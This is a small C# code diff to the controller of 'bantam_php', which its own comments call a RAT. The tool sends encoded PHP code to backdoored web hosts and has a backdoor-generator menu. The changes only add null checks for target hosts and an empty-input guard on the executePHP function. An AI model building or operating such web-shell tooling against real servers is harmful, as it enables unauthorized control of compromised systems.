@@ -16,7 +16,6 @@ namespace bantam_php
 {
     public partial class BantamMain : Form
     {
-
         /// <summary>
         /// 
         /// </summary>
@@ -54,11 +53,15 @@ namespace bantam_php
                     foreach (XmlNode itemNode in itemNodes)
                     {
                         //Hot select target onload up
-                        string host = itemNode?.Attributes?["host"].Value;
-
+                        string host = (itemNode.Attributes["host"] != null) ? itemNode?.Attributes?["host"].Value : "";
                         string requestArg = (itemNode.Attributes["request_arg"] != null) ? itemNode?.Attributes?["request_arg"].Value : "";
                         string requestMethod = (itemNode?.Attributes?["request_method"] != null) ? itemNode?.Attributes?["request_method"].Value : "";
 
+                        //invalid host/target name
+                        if (string.IsNullOrEmpty(host))
+                        {
+                            continue;
+                        }
                         //add the host to our client class containing infos
                         Clients.Add(host, new ClientInfo());
 
@@ -1522,13 +1525,18 @@ namespace bantam_php
         }
 
         /// <summary>
-        /// 
+        /// Wrapper for "makeRequest", appends encoding specific to this rat leaving "makeRequest" dynamic
         /// </summary>
         /// <param name="url"></param>
         /// <param name="code"></param>
         /// <returns></returns>
         public string executePHP(string url, string code)
         {
+            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(code))
+            {
+                return "";
+            }
+
             //remove extra spaces, line breakes, tabs, whitespace, urlendcode then base64 encode
             string minifiedCode = PHP_Helper.minifyCode(code);
             string encodedCode = HttpUtility.UrlEncode(minifiedCode);
@@ -1539,11 +1547,6 @@ namespace bantam_php
         }
 
         #endregion
-
-        private void BantamMain_Load(object sender, EventArgs e)
-        {
-
-        }
 
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
         {
